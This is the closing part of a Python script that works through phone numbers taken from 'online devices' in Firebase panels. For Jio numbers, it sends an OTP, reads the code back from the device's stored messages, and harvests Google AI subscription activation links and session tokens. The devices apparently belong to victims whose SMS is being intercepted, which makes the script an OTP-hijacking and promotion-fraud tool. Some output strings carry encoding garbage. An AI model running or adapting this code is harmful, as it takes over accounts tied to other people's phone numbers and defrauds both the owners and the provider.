    targets = [(d, m) for d, m in targets if m not in used_numbers]
    skipped = before_filter - len(targets)

    print(f"\nTotal Unique Number Candidates: {before_filter}")
    if skipped:
        print(f"Skipped (already processed before): {skipped}")
    print(f"Numbers to process this run: {len(targets)}")
    if not targets:
        print("Koi new number nahi mila.")
        return 1

    # Re-establish sync firebase sessions for the panels we'll actually use in STEP 3
    panel_sync_sessions: dict[str, requests.Session] = {}
    for _, info in all_online_devices.items():
        url = info["base_url"]
        if url not in panel_sync_sessions:
            panel_sync_sessions[url] = firebase_session()
        info["firebase_session"] = panel_sync_sessions[url]

    print("\n" + "=" * 70)
    print("STEP 3 (sync): Starting OTP + Activation on all unique numbers...")
    print("=" * 70)

    statuses: Counter[str] = Counter()
    valid_links = 0
    for serial, (device_id, mobile) in enumerate(targets, start=1):
        info = all_online_devices.get(device_id)
        if not info:
            continue

        print(f"\n[{serial}/{len(targets)}] Device: {device_id} | ending: {mobile[-4:]}")
        base_url = info["base_url"]
        firebase_key = info["firebase_key"]
        firebase = info["firebase_session"]
        device = info["data"]

        if not isinstance(device, dict) or device.get("status") is not True:
            status, url = "device_offline", ""
        else:
            jio = jio_session()
            if not is_jio_number(jio, mobile):
                status, url = "not_jio_number", ""
            else:
                known_keys = set(device_messages.get(device_id, {}))
                if not send_otp(jio, mobile):
                    status, url = "otp_send_failed", ""
                elif not wait_for_otp(firebase, base_url, firebase_key, device_id, known_keys, jio, mobile):
                    status, url = "otp_failed", ""
                else:
                    status, url = get_activation(jio)

        statuses[status] += 1
        save_used_number(mobile)
        link_valid = save_link(url)
        if link_valid:
            valid_links += 1
        save_result(serial, device_id, mobile, status, url)
        if status == "activation_url_found":
            try:
                save_jio_session(mobile, jio)
                # Ping immediately to extend JWT for regenerate pickup
                try:
                    jio.get("https://www.jio.com/api/jio-ott-service/ott/subscription/google-ai",
                            headers={"Referer": "https://www.jio.com/selfcare/googleai/?header=no&type=Z0241&source=JIO"},
                            timeout=15)
                    save_jio_session(mobile, jio)  # save again with extended JWT
                except: pass
            except Exception as e:
                print(f"  (session save failed: {e})")
        print(f"Status: {status}")
        if url:
            print(f"LINK â†’ {url}")
            print(f"Valid links so far: {valid_links}")

    print("\n" + "=" * 70)
    print("FINAL SUMMARY")
    print("=" * 70)
    print(f"Total Online Devices : {len(all_online_devices)}")
    print(f"Unique Numbers : {len(targets)}")
    for status, count in sorted(statuses.items()):
        print(f"{status:25}: {count}")
    print(f"\nâœ… VALID links saved this run : {valid_links}")
    total_links = len(LINKS_FILE.read_text(encoding="utf-8").splitlines()) if LINKS_FILE.exists() else 0
    print(f"ðŸ“„ Total valid links in file  : {total_links}")
    print(f"\nLinks file : {LINKS_FILE.resolve()}")
    print(f"Results file : {RESULTS_FILE.resolve()}")
    return 0


def main() -> int:
    """Sync entry that runs the async main."""
    return asyncio.run(main_async())

if __name__ == "__main__":
    raise SystemExit(main())
